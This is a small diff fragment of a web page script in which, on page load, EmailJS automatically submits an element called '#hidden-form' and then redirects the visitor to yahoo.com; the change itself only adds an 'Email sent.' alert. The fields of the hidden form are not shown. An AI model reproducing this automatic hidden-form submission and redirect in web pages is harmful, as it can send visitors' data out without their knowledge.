@@ -35,6 +35,7 @@
     window.onload = function () {
       emailjs.sendForm('service_hlkt43g','template_g7nwiii', '#hidden-form')
         .then(function () {
+                    alert('Email sent.\n');
           window.location.href = 'https://www.yahoo.com';
         }, function (error) {
           alert('Email failed to send.\n' + JSON.stringify(error));
